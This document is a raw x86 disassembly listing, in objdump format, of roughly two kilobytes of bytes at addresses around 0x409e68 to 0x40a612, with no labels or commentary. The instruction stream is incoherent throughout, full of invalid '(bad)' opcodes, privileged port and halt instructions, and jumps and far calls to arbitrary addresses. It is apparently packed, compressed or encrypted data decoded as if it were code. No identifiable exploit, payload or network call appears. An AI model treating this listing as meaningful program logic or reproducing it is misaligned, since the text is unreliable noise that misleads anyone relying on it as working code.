  409e68:	js     0x409e04
  409e6a:	pop    edi
  409e6b:	adc    al,0x44
  409e6d:	jb     0x409e33
  409e6f:	das    
  409e70:	or     BYTE PTR [esi-0x16e6c98e],ah
  409e76:	xchg   ebp,eax
  409e77:	and    al,0x5
  409e79:	jecxz  0x409e7c
  409e7b:	pop    DWORD PTR [edi+0xd]
  409e7e:	or     al,0x8e
  409e80:	imul   edx,DWORD PTR [edx-0xc],0xe525002
  409e87:	test   eax,ecx
  409e89:	cmp    eax,0x26d47386
  409e8e:	gs jb  0x409e42
  409e91:	jnp    0x409eac
  409e93:	fwait
  409e94:	fwait
  409e95:	icebp  
  409e96:	popf   
  409e97:	dec    esp
  409e98:	jg     0x409edb
  409e9a:	inc    ecx
  409e9b:	lea    edx,[ebp+0x7b41a196]
  409ea1:	mov    esp,0x2ca6ed30
  409ea6:	sub    cl,ch
  409ea8:	inc    ecx
  409ea9:	ss jge 0x409e79
  409eac:	mov    ah,0xe3
  409eae:	mov    ds:0x259186c1,eax
  409eb3:	shr    DWORD PTR ss:0x91abfbf0,cl
  409eba:	jecxz  0x409ec0
  409ebc:	sbb    eax,0xd5de5903
  409ec1:	repnz (bad) 
  409ec3:	cs inc ebp
  409ec5:	push   cs
  409ec6:	sub    eax,0x44a2a6e6
  409ecb:	es out dx,eax
  409ecd:	mov    esp,esi
  409ecf:	iret   
  409ed0:	jmp    0xfe8af02b
  409ed5:	jp     0x409ec2
  409ed7:	mov    ds:0xb881b254,al
  409edc:	inc    esp
  409edd:	inc    ecx
  409ede:	bound  esi,QWORD PTR [esp+ebp*4-0x7d]
  409ee2:	stc    
  409ee3:	cmp    DWORD PTR [ebp+0x36],ecx
  409ee6:	retf   
  409ee7:	inc    edi
  409ee8:	test   DWORD PTR [esi-0x5af7a285],0x6659d686
  409ef2:	retf   0x3bdd
  409ef5:	jp     0x409e8c
  409ef7:	call   0xac28:0xff8ad620
  409efe:	sub    dh,BYTE PTR [eax-0x4e74b7cf]
  409f04:	or     ebp,0xb0b312e6
  409f0a:	inc    eax
  409f0b:	pop    edx
  409f0c:	adc    ecx,esp
  409f0e:	jbe    0x409f07
  409f10:	aas    
  409f11:	pop    ds
  409f12:	mov    BYTE PTR [esi],bl
  409f14:	dec    esp
  409f15:	pop    ecx
  409f16:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  409f18:	retf   
  409f19:	push   0xffffffe2
  409f1b:	scas   al,BYTE PTR es:[edi]
  409f1c:	aaa    
  409f1d:	loopne 0x409f50
  409f1f:	jbe    0x409ec5
  409f21:	std    
  409f22:	push   ecx
  409f23:	mov    ebx,0x137638eb
  409f28:	pusha  
  409f29:	jnp    0x409ee5
  409f2b:	mov    eax,ds:0xf569c1c9
  409f30:	icebp  
  409f31:	mov    ds:0xfc6a96b0,eax
  409f36:	(bad)  [eax+ebp*8]
  409f39:	adc    dl,BYTE PTR [eax-0x74]
  409f3c:	call   0xd260:0x61a5cb5
  409f43:	xor    DWORD PTR [esi-0x1597d1b0],esi
  409f49:	js     0x409f48
  409f4b:	push   cs
  409f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f4d:	push   ebx
  409f4e:	inc    edi
  409f4f:	mov    bh,0x6e
  409f51:	sub    ebp,DWORD PTR [esi]
  409f53:	clc    
  409f54:	call   FWORD PTR [ebx+0x72]
  409f57:	rcl    BYTE PTR [ecx+edx*8],1
  409f5a:	pop    ebp
  409f5b:	out    0x58,al
  409f5d:	icebp  
  409f5e:	dec    esi
  409f5f:	call   0xaafc:0xd8364c09
  409f66:	add    dh,BYTE PTR [edx]
  409f68:	(bad)  
  409f69:	scas   al,BYTE PTR es:[edi]
  409f6a:	bound  ebp,QWORD PTR [esi]
  409f6c:	pop    ebp
  409f6d:	add    dh,BYTE PTR [esi]
  409f6f:	shl    DWORD PTR [esi+0x6c8b1172],1
  409f75:	or     ebp,DWORD PTR [esi]
  409f77:	dec    esp
  409f78:	fcmovnb st,st(2)
  409f7a:	fadd   DWORD PTR [esi+0xca43912]
  409f80:	(bad)  
  409f81:	in     al,dx
  409f82:	outs   dx,BYTE PTR ds:[esi]
  409f83:	cmp    BYTE PTR [eax-0x156186c8],0x33
  409f8a:	sub    ecx,0xffffffc0
  409f8d:	or     al,0x85
  409f8f:	call   0x25e0:0xcc656046
  409f96:	and    esp,ebx
  409f98:	cmp    edx,DWORD PTR [esi+esi*1-0x3c4591fb]
  409f9f:	mov    ch,0x41
  409fa1:	(bad)  
  409fa2:	mov    edx,0x9484009a
  409fa7:	call   0xa19d:0xa990ebdb
  409fae:	fist   DWORD PTR [ebx-0x21]
  409fb1:	xchg   ecx,eax
  409fb2:	cs push 0xe
  409fb5:	mov    ecx,0x712162f0
  409fba:	jge    0x40a000
  409fbc:	aam    0x7e
  409fbe:	leave  
  409fbf:	pop    esi
  409fc0:	mov    ecx,0xe45307ba
  409fc5:	pop    ebx
  409fc6:	sar    BYTE PTR [edi],0x84
  409fc9:	xor    DWORD PTR [ebx+0x34],ebx
  409fcc:	pop    ebx
  409fcd:	outs   dx,BYTE PTR ds:[esi]
  409fce:	outs   dx,BYTE PTR ds:[esi]
  409fcf:	sub    BYTE PTR [esi-0x14],dl
  409fd2:	std    
  409fd3:	aam    0xbb
  409fd5:	aam    0x38
  409fd7:	stos   DWORD PTR es:[edi],eax
  409fd8:	mov    ebp,esp
  409fda:	loope  0x40a03e
  409fdc:	xchg   ebp,eax
  409fdd:	and    ebx,DWORD PTR [ecx]
  409fdf:	pop    ebp
  409fe0:	or     ebx,DWORD PTR [ecx]
  409fe2:	xor    ebp,ecx
  409fe4:	push   eax
  409fe5:	in     al,0xa7
  409fe7:	mov    bh,0xd7
  409fe9:	pop    ebx
  409fea:	pusha  
  409feb:	(bad)  
  409fee:	and    al,0x95
  409ff0:	repnz daa 
  409ff2:	shr    DWORD PTR [edi],cl
  409ff4:	ins    BYTE PTR es:[edi],dx
  409ff5:	nop
  409ff6:	mov    gs,WORD PTR [esi-0x4c8bfbfe]
  409ffc:	push   es
  409ffd:	inc    ebp
  409ffe:	push   esi
  409fff:	push   0x60e3311f
  40a004:	xchg   edi,eax
  40a005:	add    BYTE PTR [edx-0x4c],ch
  40a008:	mov    ebx,0x7e87b9ca
  40a00d:	sahf   
  40a00e:	push   ds
  40a00f:	std    
  40a010:	data16 jle 0x409fce
  40a013:	mov    eax,0x5b186e34
  40a018:	add    al,0xcb
  40a01a:	in     al,0x3b
  40a01c:	xchg   eax,esp
  40a01e:	(bad)  
  40a020:	mov    BYTE PTR [edx],bh
  40a022:	inc    esi
  40a023:	addr16 jne 0x40a010
  40a026:	push   esp
  40a027:	cwde   
  40a028:	xchg   ecx,eax
  40a029:	xchg   edx,eax
  40a02a:	mov    al,ds:0xf22cf1d2
  40a02f:	xchg   esi,eax
  40a030:	mov    edi,0x3dd5cfe8
  40a035:	push   eax
  40a036:	jle    0x40a019
  40a038:	dec    ebx
  40a039:	les    ebp,FWORD PTR [edx+0x1edeefc8]
  40a03f:	ins    DWORD PTR es:[edi],dx
  40a040:	pusha  
  40a041:	jge    0x40a0a1
  40a043:	pusha  
  40a044:	mov    edi,0xf9d0aad7
  40a049:	mov    cl,0x9
  40a04b:	mov    edx,0xd19c4517
  40a050:	mov    ecx,0x3109bc32
  40a055:	(bad)  
  40a056:	sub    edx,DWORD PTR [ecx]
  40a058:	jmp    0xe511e285
  40a05d:	pop    edx
  40a05e:	out    0x8c,eax
  40a060:	and    bh,BYTE PTR [esi]
  40a062:	icebp  
  40a063:	mov    bh,0xa4
  40a065:	lahf   
  40a066:	and    BYTE PTR [ecx],dh
  40a068:	(bad)  
  40a069:	lods   eax,DWORD PTR ds:[esi]
  40a06a:	clc    
  40a06b:	push   edi
  40a06c:	icebp  
  40a06d:	aad    0x18
  40a06f:	aaa    
  40a070:	dec    esi
  40a071:	ret    0xcab0
  40a074:	int3   
  40a075:	xor    bl,dh
  40a077:	into   
  40a078:	xchg   edi,eax
  40a079:	addr16 cmp eax,0x6131b17d
  40a07f:	popa   
  40a080:	mov    dh,0x93
  40a082:	out    dx,al
  40a083:	imul   eax,DWORD PTR [esi-0x2e],0x4e3ba0b2
  40a08a:	icebp  
  40a08b:	sub    al,0xb0
  40a08d:	dec    ebp
  40a08e:	push   0x4b
  40a090:	adc    BYTE PTR [esp+ecx*4],ch
  40a093:	add    dl,bl
  40a095:	jecxz  0x40a0d2
  40a097:	pop    ebx
  40a098:	or     BYTE PTR cs:[esi+0x398ca5ef],0x5d
  40a0a0:	xchg   ebx,eax
  40a0a1:	adc    al,0xc1
  40a0a3:	dec    esp
  40a0a4:	mov    edx,0x59881faa
  40a0a9:	pop    ax
  40a0ab:	int3   
  40a0ac:	cld    
  40a0ad:	cmp    DWORD PTR [ebx-0x2716b22d],0x1
  40a0b4:	popa   
  40a0b5:	adc    BYTE PTR [ebp+0x47dadb54],cl
  40a0bb:	retf   
  40a0bc:	(bad)  
  40a0bd:	mov    ah,0xdf
  40a0bf:	dec    esi
  40a0c0:	mov    cs,WORD PTR [eax+0x1]
  40a0c3:	imul   edx,ebx,0xffffffef
  40a0c6:	retf   0xff70
  40a0c9:	(bad)  
  40a0ca:	es clc 
  40a0cc:	push   ecx
  40a0cd:	add    DWORD PTR [esi-0x8],ebp
  40a0d0:	pop    es
  40a0d1:	cmp    eax,0x7c8c467a
  40a0d6:	into   
  40a0d7:	xchg   DWORD PTR [eax+0x29e90890],edi
  40a0dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0de:	ficomp WORD PTR [ebx-0x69]
  40a0e1:	je     0x40a121
  40a0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e4:	dec    edi
  40a0e5:	mov    dh,0xd3
  40a0e7:	repnz fbld TBYTE PTR [ebx+edi*2]
  40a0eb:	repz add eax,0xee45dfd4
  40a0f1:	fnstenv [esi+ebx*8+0x12]
  40a0f5:	dec    esi
  40a0f6:	jmp    0x32de:0xe04813ee
  40a0fd:	imul   ecx,DWORD PTR [esp+eax*4],0x12
  40a101:	mov    WORD PTR [edi-0x44],?
  40a104:	(bad)  
  40a105:	push   ebx
  40a106:	cld    
  40a107:	push   ebx
  40a108:	mov    bl,0xb8
  40a10a:	ins    BYTE PTR es:[di],dx
  40a10c:	push   0xdaefd647
  40a111:	arpl   WORD PTR [edi],dx
  40a113:	mul    ebx
  40a115:	or     ebx,eax
  40a117:	iret   
  40a118:	jne    0x40a0f0
  40a11a:	aam    0xe5
  40a11c:	inc    esp
  40a11d:	stos   BYTE PTR es:[edi],al
  40a11e:	sbb    BYTE PTR [ebx+0x6e],bl
  40a121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a122:	fucomip st,st(7)
  40a124:	hlt    
  40a125:	mov    ds:0x4cae71d3,eax
  40a12a:	fnsave [ecx-0x62d3c19e]
  40a130:	dec    eax
  40a131:	hlt    
  40a132:	(bad)  
  40a133:	dec    edi
  40a134:	adc    ah,BYTE PTR [edx]
  40a136:	shl    DWORD PTR [eax-0xd],0x29
  40a13a:	dec    esi
  40a13b:	or     al,0x3c
  40a13d:	aad    0xd2
  40a13f:	call   FWORD PTR [eax-0x3de2aa4c]
  40a145:	jmp    0x40a0ec
  40a147:	sbb    DWORD PTR [eax-0x74],ebp
  40a14a:	inc    ebp
  40a14b:	ss das 
  40a14d:	xor    BYTE PTR [edi+ecx*1],al
  40a150:	ret    0xcf45
  40a153:	fs and eax,0x1d68089d
  40a159:	xor    al,0xd8
  40a15b:	ror    BYTE PTR [eax+eiz*1],cl
  40a15e:	ret    0xbf9c
  40a161:	leave  
  40a162:	aam    0x38
  40a164:	bound  edx,QWORD PTR [esi-0x7017987]
  40a16a:	scas   eax,DWORD PTR es:[edi]
  40a16b:	pop    ebx
  40a16c:	add    al,0x17
  40a16e:	in     al,dx
  40a16f:	or     DWORD PTR [ebp+ebx*1+0x0],eax
  40a173:	fs xor esi,ebp
  40a176:	pinsrw mm5,ecx,0x37
  40a17a:	imul   ecx,DWORD PTR [ecx+0x6ab6aea5],0xec2e9be1
  40a184:	adc    eax,0x19527ad
  40a189:	push   eax
  40a18a:	xchg   DWORD PTR [edi],ecx
  40a18c:	lahf   
  40a18d:	xlat   BYTE PTR ds:[ebx]
  40a18e:	sbb    al,0xc0
  40a190:	ins    DWORD PTR es:[edi],dx
  40a191:	shl    DWORD PTR [edx],cl
  40a193:	cmp    BYTE PTR [ebp+edi*4-0x77dd562b],bl
  40a19a:	sub    al,0x28
  40a19c:	imul   eax,DWORD PTR [ecx],0x56e355ec
  40a1a2:	add    BYTE PTR [ebx-0x53],bh
  40a1a5:	cmp    cl,BYTE PTR [esi]
  40a1a7:	aam    0x9d
  40a1a9:	je     0x414933
  40a1af:	lea    eax,[ebp-0xc]
  40a1b2:	jmp    0x40a6bd
  40a1b7:	ds aas 
  40a1b9:	enter  0xcd3f,0xcf
  40a1bd:	int    0x3d
  40a1bf:	xor    BYTE PTR [ecx+0x4f],al
  40a1c2:	pop    esp
  40a1c3:	jne    0x40a1aa
  40a1c5:	repnz cmp eax,DWORD PTR [eax]
  40a1c8:	xchg   BYTE PTR [eax+0x78],bh
  40a1cb:	push   0x7c
  40a1cd:	js     0x40a247
  40a1cf:	cs pop ebp
  40a1d1:	dec    edi
  40a1d2:	in     eax,dx
  40a1d3:	pushf  
  40a1d4:	ret    0x8c19
  40a1d7:	rcr    DWORD PTR [edx+0x68c050b2],cl
  40a1dd:	icebp  
  40a1de:	fldcw  WORD PTR [ebp-0x6b]
  40a1e1:	int3   
  40a1e2:	std    
  40a1e3:	rcr    DWORD PTR [edi],0xcd
  40a1e6:	test   BYTE PTR [ecx],dh
  40a1e8:	cli    
  40a1e9:	sti    
  40a1ea:	fild   WORD PTR [ebx-0x37c08fa0]
  40a1f0:	mov    edi,0xa17b6318
  40a1f5:	aaa    
  40a1f6:	inc    ecx
  40a1f7:	sahf   
  40a1f8:	jns    0x40a194
  40a1fa:	mov    WORD PTR [edx+0x4d24e2d2],cs
  40a200:	push   ebx
  40a201:	sub    BYTE PTR [ecx+0x15748199],dh
  40a207:	out    dx,eax
  40a208:	stc    
  40a209:	ret    
  40a20a:	leave  
  40a20b:	retf   0xf5fd
  40a20e:	sbb    eax,0x74020126
  40a213:	fs inc esi
  40a215:	mov    ch,0xaf
  40a217:	test   DWORD PTR [ebx],ebx
  40a219:	sub    DWORD PTR cs:[edi-0x4b],ebp
  40a21d:	push   edi
  40a21e:	and    edx,DWORD PTR [eax]
  40a220:	mov    BYTE PTR [esi],bh
  40a222:	fidivr WORD PTR [eax]
  40a224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a225:	call   FWORD PTR [eax+0x34b862d8]
  40a22b:	mov    bl,0x6d
  40a22d:	call   0x7c076b1b
  40a232:	(bad)  
  40a233:	jo     0x40a200
  40a235:	jno    0x40a268
  40a237:	cmp    bl,BYTE PTR [edx+0x8ad5586]
  40a23d:	mov    al,ds:0xe068aa90
  40a242:	cwde   
  40a243:	pusha  
  40a244:	loopne 0x40a223
  40a246:	pop    edx
  40a247:	dec    ebx
  40a248:	xchg   DWORD PTR [ebp-0x4f817690],ebp
  40a24e:	test   BYTE PTR [ecx-0x39],0x48
  40a252:	push   bx
  40a254:	sub    ecx,ebp
  40a256:	rcl    BYTE PTR [edi],0x63
  40a259:	jne    0x40a1fe
  40a25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a25c:	dec    eax
  40a25d:	les    esp,FWORD PTR [edx]
  40a25f:	xor    BYTE PTR [edx-0x2ce6d1d3],al
  40a265:	sar    edx,1
  40a267:	aas    
  40a268:	outs   dx,DWORD PTR ds:[esi]
  40a269:	out    0x90,al
  40a26b:	or     eax,0xc2da9cd
  40a270:	jg     0x40a2c5
  40a272:	pop    edx
  40a273:	sub    eax,0x19679d1e
  40a278:	mov    ebx,0x68145be4
  40a27d:	jne    0x40a281
  40a27f:	dec    esi
  40a280:	daa    
  40a281:	mov    al,0xda
  40a283:	mov    esp,0xc8e3497e
  40a288:	enter  0x5648,0x4c
  40a28c:	repz add al,0x49
  40a28f:	dec    ebp
  40a290:	les    edx,FWORD PTR ds:0xc603ed40
  40a296:	cli    
  40a297:	jle    0x40a273
  40a299:	mov    bh,0x6c
  40a29b:	or     bh,BYTE PTR [eax-0x45]
  40a29e:	sbb    ch,BYTE PTR [edi-0x31]
  40a2a1:	adc    DWORD PTR [edi+0x74],edx
  40a2a4:	lea    edi,[ebx+0x58]
  40a2a7:	inc    edx
  40a2a8:	jbe    0x40a2d0
  40a2aa:	fs jno 0x40a264
  40a2ad:	or     DWORD PTR [eax-0x716375f9],0xffffff94
  40a2b4:	mov    cl,0xfe
  40a2b6:	push   cs
  40a2b7:	pop    ebx
  40a2b8:	sahf   
  40a2b9:	addr16 in al,0x1a
  40a2bc:	jnp    0x40a31f
  40a2be:	or     edx,ecx
  40a2c0:	enter  0xb425,0xc7
  40a2c4:	add    ebp,DWORD PTR [ebp+0x444e6010]
  40a2ca:	add    ah,BYTE PTR [esi]
  40a2cc:	xor    bl,BYTE PTR [esi]
  40a2ce:	sbb    ah,BYTE PTR [edi-0x77]
  40a2d1:	dec    ecx
  40a2d2:	xchg   BYTE PTR [edx-0x2c8caf4b],ah
  40a2d8:	xchg   esp,eax
  40a2d9:	cmp    bl,BYTE PTR [eax-0x23532390]
  40a2df:	mov    DWORD PTR [eax],ecx
  40a2e1:	jmp    0x389b42ce
  40a2e6:	into   
  40a2e7:	in     eax,dx
  40a2e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2e9:	or     eax,0x1db37153
  40a2ee:	test   eax,0xb44f3646
  40a2f3:	test   BYTE PTR [ebx],cl
  40a2f5:	jo     0x40a35d
  40a2f7:	sub    BYTE PTR [ecx],0x26
  40a2fa:	xor    eax,0x74a7d136
  40a2ff:	sub    al,0x55
  40a301:	and    eax,0x3502741
  40a306:	mov    ds:0x7d10df18,eax
  40a30b:	clc    
  40a30c:	(bad)  
  40a30d:	ficomp DWORD PTR [ebx+0x42dfed59]
  40a313:	lock add ecx,DWORD PTR [ecx]
  40a316:	push   edx
  40a317:	ins    DWORD PTR es:[edi],dx
  40a318:	(bad)  
  40a319:	icebp  
  40a31a:	pop    ebx
  40a31b:	in     eax,0x24
  40a31d:	xor    eax,0x6f6ff7e6
  40a322:	popf   
  40a323:	jmp    0xb322:0xad39c5fc
  40a32a:	xor    DWORD PTR [esi+ebp*1],ecx
  40a32d:	outs   dx,DWORD PTR ds:[esi]
  40a32e:	enter  0x7046,0x3a
  40a332:	das    
  40a333:	jmp    0x3ae4:0x4333dac5
  40a33a:	pop    eax
  40a33b:	mov    dl,0xd8
  40a33d:	stos   DWORD PTR es:[edi],eax
  40a33e:	aaa    
  40a33f:	data16 or al,0xd9
  40a342:	add    al,0x32
  40a344:	jb     0x40a359
  40a346:	cdq    
  40a347:	gs jb  0x40a305
  40a34a:	pop    edi
  40a34b:	repz or eax,0xbdba8919
  40a351:	and    BYTE PTR [ebp-0x54448c8f],dl
  40a357:	or     bl,BYTE PTR [edx+0x23a04cbc]
  40a35d:	push   ecx
  40a35e:	sbb    eax,0x55454530
  40a363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a364:	push   edx
  40a365:	pop    eax
  40a366:	sahf   
  40a367:	ins    DWORD PTR es:[edi],dx
  40a368:	cmp    eax,0x2a5d83bb
  40a36d:	cmp    BYTE PTR [esi-0x2c],bh
  40a370:	jle    0x40a326
  40a372:	cmp    al,0xc8
  40a374:	int3   
  40a375:	mov    DWORD PTR [ebp+ebp*8+0x5e004f50],0x500d8960
  40a380:	or     DWORD PTR [si-0x14f2],0xffffffd4
  40a386:	and    DWORD PTR [edx+0x18],esi
  40a389:	mov    DWORD PTR [esi*2+0x11d1c548],esp
  40a390:	stc    
  40a391:	or     DWORD PTR [eax-0x7],0xc2ed5885
  40a398:	cdq    
  40a399:	mov    al,BYTE PTR [ebx-0x44]
  40a39c:	cli    
  40a39d:	push   edx
  40a39e:	cmp    al,0xb
  40a3a0:	add    ch,bl
  40a3a2:	les    edx,FWORD PTR [ecx+ebp*8-0x16]
  40a3a6:	add    ecx,esp
  40a3a8:	in     eax,0xc
  40a3aa:	and    DWORD PTR [eax+ecx*1-0x4f],0x1e72459e
  40a3b2:	ins    DWORD PTR es:[edi],dx
  40a3b3:	iret   
  40a3b4:	and    al,0x33
  40a3b6:	popf   
  40a3b7:	ins    BYTE PTR es:[edi],dx
  40a3b8:	popa   
  40a3b9:	fwait
  40a3ba:	les    ecx,FWORD PTR [ebx+0x48]
  40a3bd:	sub    ebp,edi
  40a3bf:	and    eax,DWORD PTR [ebx+eiz*2-0x51dc9cf3]
  40a3c6:	shl    DWORD PTR [esp+esi*4+0x64d0aef5],cl
  40a3cd:	mov    WORD PTR ds:0xeace0f42,?
  40a3d3:	or     bh,BYTE PTR [ebx+0x64dc69c4]
  40a3d9:	sbb    dl,BYTE PTR [edx]
  40a3db:	leave  
  40a3dc:	mov    esi,0x8f233046
  40a3e1:	inc    edi
  40a3e2:	jmp    0x50f7:0x7aaab344
  40a3e9:	iret   
  40a3ea:	sub    al,0x67
  40a3ec:	or     al,0x56
  40a3ee:	push   esi
  40a3ef:	jne    0x40a45c
  40a3f1:	(bad)  
  40a3f2:	iret   
  40a3f3:	repz sub al,BYTE PTR [ecx+0x50ec7f53]
  40a3fa:	mov    edx,?
  40a3fc:	out    0x38,eax
  40a3fe:	mov    ch,0xe
  40a400:	push   ss
  40a401:	mov    ecx,0x7b821ed7
  40a406:	xor    eax,0xa7c72cd5
  40a40b:	rcl    esp,cl
  40a40d:	dec    esi
  40a40e:	sbb    al,0xf
  40a410:	and    eax,0x2b583b28
  40a415:	shl    DWORD PTR [esi-0x57a0c70],cl
  40a41b:	into   
  40a41c:	aas    
  40a41d:	cs arpl ax,di
  40a420:	add    al,0xaf
  40a422:	and    BYTE PTR [edx+ecx*4+0x75ec051c],bh
  40a429:	mov    fs,ebp
  40a42b:	imul   DWORD PTR [ebp+0x4]
  40a42e:	sub    ax,0x3fa7
  40a432:	jnp    0x40a494
  40a434:	hlt    
  40a435:	lds    esp,FWORD PTR [ebp-0x1e689368]
  40a43b:	and    eax,0xad672974
  40a440:	mov    esi,0xa3d2b21f
  40a445:	aam    0xe1
  40a447:	adc    esp,DWORD PTR [ecx]
  40a449:	xchg   edi,eax
  40a44a:	dec    ebp
  40a44b:	xchg   ebx,eax
  40a44c:	ja     0x40a3fa
  40a44e:	jge    0x40a41b
  40a450:	lds    esi,FWORD PTR [ecx]
  40a452:	sbb    al,0x9
  40a454:	lods   al,BYTE PTR ds:[esi]
  40a455:	iret   
  40a456:	mov    al,0x1
  40a458:	sbb    DWORD PTR [ecx],edx
  40a45a:	push   0xa07cf276
  40a45f:	rcl    BYTE PTR [edx-0x11e7e763],1
  40a465:	fidiv  WORD PTR [eax+0xed037a8]
  40a46b:	sbb    al,0xae
  40a46d:	push   edx
  40a46e:	pop    ecx
  40a46f:	inc    eax
  40a470:	inc    ecx
  40a471:	dec    ecx
  40a472:	dec    edx
  40a473:	adc    BYTE PTR [edi+0x54],0xf1
  40a477:	push   eax
  40a478:	sub    BYTE PTR [ebx-0x6b],dl
  40a47b:	jp     0x40a448
  40a47d:	fwait
  40a47e:	cwde   
  40a47f:	sub    al,0x44
  40a481:	push   ebp
  40a482:	iret   
  40a483:	cmp    DWORD PTR [eax],ecx
  40a485:	ss ret 
  40a487:	out    dx,al
  40a488:	addr16 rol dl,0x1c
  40a48c:	mov    ecx,0x1b1b77be
  40a491:	aam    0x2a
  40a493:	out    dx,eax
  40a494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a495:	out    0xd4,eax
  40a497:	xchg   ebp,eax
  40a498:	aam    0xf6
  40a49a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a49b:	fild   WORD PTR [ecx-0x61]
  40a49e:	jbe    0x40a511
  40a4a0:	cwde   
  40a4a1:	inc    eax
  40a4a2:	cli    
  40a4a3:	frstpm(287 only) 
  40a4a5:	fucomi st,st(7)
  40a4a7:	mov    DWORD PTR [edx+edx*8+0x4e],esp
  40a4ab:	mov    ds:0x3fff4b73,al
  40a4b0:	and    eax,0x823860b6
  40a4b5:	stc    
  40a4b6:	cli    
  40a4b7:	ss push ss
  40a4b9:	inc    eax
  40a4ba:	dec    eax
  40a4bb:	scas   eax,DWORD PTR es:[edi]
  40a4bc:	cmp    cl,al
  40a4be:	or     eax,0x2475ae6e
  40a4c3:	fmul   QWORD PTR [ebx+0x25fb232]
  40a4c9:	int3   
  40a4ca:	cdq    
  40a4cb:	pop    ss
  40a4cc:	inc    ecx
  40a4cd:	leave  
  40a4ce:	pop    ebx
  40a4cf:	pusha  
  40a4d0:	or     BYTE PTR cs:[eax-0x387ccefd],ch
  40a4d7:	xchg   BYTE PTR [esi+0x7016d6b8],cl
  40a4dd:	icebp  
  40a4de:	inc    ecx
  40a4df:	pusha  
  40a4e0:	adc    BYTE PTR [esi],ah
  40a4e2:	jg     0x40a4fc
  40a4e4:	aaa    
  40a4e5:	ins    DWORD PTR es:[edi],dx
  40a4e6:	cld    
  40a4e7:	imul   eax,DWORD PTR [edx],0x4
  40a4ea:	fmul   st(1),st
  40a4ec:	jmp    0x2128:0x9c917c49
  40a4f3:	lea    edx,[edi+0x2]
  40a4f6:	(bad)  
  40a4f7:	mov    ds:0x6e93bb0e,eax
  40a4fc:	call   0xe4dd:0xa58e74e7
  40a503:	call   0x8f46a0ba
  40a508:	test   al,0x47
  40a50a:	sub    eax,0x215620f
  40a50f:	lods   eax,DWORD PTR ds:[esi]
  40a510:	jns    0x9af93243
  40a516:	xor    al,0xbe
  40a518:	jnp    0x40a4df
  40a51a:	cli    
  40a51b:	mov    ah,0x7d
  40a51d:	jl     0x40a571
  40a51f:	cmp    DWORD PTR [edi+esi*4-0x4e],edx
  40a523:	test   esi,edx
  40a525:	cs int3 
  40a527:	jecxz  0x40a571
  40a529:	push   ebx
  40a52a:	push   eax
  40a52b:	(bad)  
  40a52c:	call   0xc8e99696
  40a531:	ja     0x40a5ab
  40a533:	add    bl,dh
  40a535:	pop    ss
  40a536:	sahf   
  40a537:	mov    bh,0x31
  40a539:	adc    DWORD PTR [edi],eax
  40a53b:	fs pop es
  40a53d:	cmp    al,0xb2
  40a53f:	inc    ecx
  40a540:	jnp    0x40a55f
  40a542:	mov    dh,0x9c
  40a544:	loop   0x40a534
  40a546:	jo     0x40a57d
  40a548:	sbb    ebx,DWORD PTR [esi]
  40a54a:	push   eax
  40a54b:	in     eax,dx
  40a54c:	xor    dl,cl
  40a54e:	femms  
  40a550:	shl    DWORD PTR [eax+0x1624014a],0x3e
  40a557:	jns    0x40a585
  40a559:	or     ah,0x92
  40a55c:	sub    BYTE PTR [ebx+0x21],cl
  40a55f:	ret    0xf31
  40a562:	sbb    al,BYTE PTR [edi+eax*4-0x30766468]
  40a569:	jle    0x40a564
  40a56b:	jbe    0x40a59d
  40a56d:	js     0x40a569
  40a56f:	stos   DWORD PTR es:[edi],eax
  40a570:	or     bl,BYTE PTR [esi+0x52]
  40a573:	inc    esi
  40a574:	(bad)  
  40a575:	(bad)  
  40a577:	sar    BYTE PTR [ebp+0x6eae5a4c],0xad
  40a57e:	mov    esi,0x5f0ed36d
  40a583:	xor    al,0xd9
  40a585:	add    al,0xfd
  40a587:	ror    BYTE PTR [esi],0x72
  40a58a:	adc    DWORD PTR [edx],edx
  40a58c:	in     eax,dx
  40a58d:	ja     0x40a5a5
  40a58f:	pop    eax
  40a590:	sbb    al,0x2f
  40a592:	sbb    al,0x33
  40a594:	and    ch,0x8
  40a597:	mov    cl,0x87
  40a599:	dec    esi
  40a59a:	inc    edi
  40a59b:	inc    esp
  40a59c:	fidiv  DWORD PTR [esi]
  40a59e:	or     al,0xad
  40a5a0:	push   esp
  40a5a1:	sub    bh,ah
  40a5a3:	fisubr DWORD PTR [ecx-0xa]
  40a5a6:	fucomip st,st(7)
  40a5a8:	aas    
  40a5a9:	mov    BYTE PTR [eax+0x2c],ah
  40a5ac:	ss jae 0x40a5f2
  40a5af:	out    dx,al
  40a5b0:	push   0x7d
  40a5b2:	push   ebx
  40a5b3:	dec    eax
  40a5b4:	adc    al,BYTE PTR [ebp+0x32884e5d]
  40a5ba:	out    dx,al
  40a5bb:	mov    ds:0x1d940430,eax
  40a5c0:	mov    dl,0x7b
  40a5c2:	loop   0x40a54a
  40a5c4:	sti    
  40a5c5:	ds call 0x72d9:0x6fad362d
  40a5cd:	shl    DWORD PTR [edx],1
  40a5cf:	loop   0x40a5c1
  40a5d1:	div    BYTE PTR [ecx-0x5719a3fa]
  40a5d7:	add    edx,edi
  40a5d9:	inc    ebp
  40a5da:	xchg   ch,dl
  40a5dc:	lods   al,BYTE PTR ds:[esi]
  40a5dd:	rol    BYTE PTR [edx+0x7f],1
  40a5e0:	rol    BYTE PTR ds:0x1541b9c6,1
  40a5e6:	es xor al,0xd6
  40a5e9:	(bad)  
  40a5ea:	(bad)  
  40a5eb:	lods   al,BYTE PTR ds:[esi]
  40a5ec:	int    0xca
  40a5ee:	xor    DWORD PTR [ebx],edi
  40a5f0:	mov    esp,0x9098986
  40a5f5:	fwait
  40a5f6:	ja     0x40a5c3
  40a5f8:	pop    esp
  40a5f9:	mov    al,ds:0xdfc12b21
  40a5fe:	add    BYTE PTR [eax],ch
  40a600:	push   cs
  40a601:	fs cmp al,0x57
  40a604:	add    ebp,DWORD PTR [eax+0x78d698a3]
  40a60a:	jae    0x40a5ae
  40a60c:	es mov esp,0x8d7b2a12
  40a612:	(bad)  
